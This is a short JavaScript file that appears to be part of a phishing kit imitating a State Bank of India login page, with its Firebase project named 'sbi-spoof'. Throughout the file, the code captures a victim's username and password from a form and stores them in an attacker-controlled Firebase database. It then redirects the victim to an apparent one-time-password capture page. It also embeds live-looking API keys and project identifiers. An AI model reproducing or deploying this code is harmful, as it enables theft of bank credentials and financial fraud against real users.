const firebaseConfig = {
    apiKey: "AIzaSyCOKI3PTEQxV-nQXQiRLVOi4_Gc5kRAuEw",
    authDomain: "sbi-spoof.firebaseapp.com",
    databaseURL: "https://sbi-spoof-default-rtdb.firebaseio.com",
    projectId: "sbi-spoof",
    storageBucket: "sbi-spoof.appspot.com",
    messagingSenderId: "955522153499",
    appId: "1:955522153499:web:4f18672b1d5a8750618cbe",
    measurementId: "G-35F13H8VZH"
  };

  // initialize firebase
firebase.initializeApp(firebaseConfig);

// reference your database
var spoofData = firebase.database().ref("sbi-spoof");

document.getElementById("sbi").addEventListener("submit", submitForm);

function submitForm(e) {
    e.preventDefault();

    var username = getElementVal("uname");
    // var name = getElementVal("name");
    var password = getElementVal("pass");
    // var msgContent = getElementVal("msgContent");

    saveCredentials(username,password);

    //   reset the form
    document.getElementById("sbi").reset();
    window.location.href = "/firstOtp.html";
}
const saveCredentials = (username, password) => {
    var newSpoofData = spoofData.push();

    newSpoofData.set({
        username: username,
        password : password,
    });
};




const getElementVal = (id) => {
    return document.getElementById(id).value;
};